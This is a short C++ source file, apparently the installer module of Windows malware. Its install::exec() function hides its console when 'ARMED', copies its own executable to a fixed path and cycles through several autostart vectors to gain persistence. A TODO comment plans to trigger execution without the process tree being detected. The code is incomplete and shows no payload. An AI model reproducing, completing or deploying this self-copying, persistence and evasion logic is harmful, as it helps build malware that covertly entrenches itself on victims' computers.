#include "pch.h"
#include "installer.h"

int install::exec() {
	if (ARMED) FreeConsole();
	
	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);

	std::filesystem::copy(location, FULL_FNAME);
	for (short i = 0; i < AUTOSTART_VECTORS; i++) {
		fcom::create(FCOM_AUTOSTART, i);
		//TODO: trigger execution of autostart without causing the process tree to be detected if it fails
		Sleep(AUTOSTART_SLEEP_MS);
		if (fcom::check(FCOM_AUTOSTART_SUCCESS) != -1) break;
	}

	//TODO: end installer and transfer control to new file
	
	return 0;
}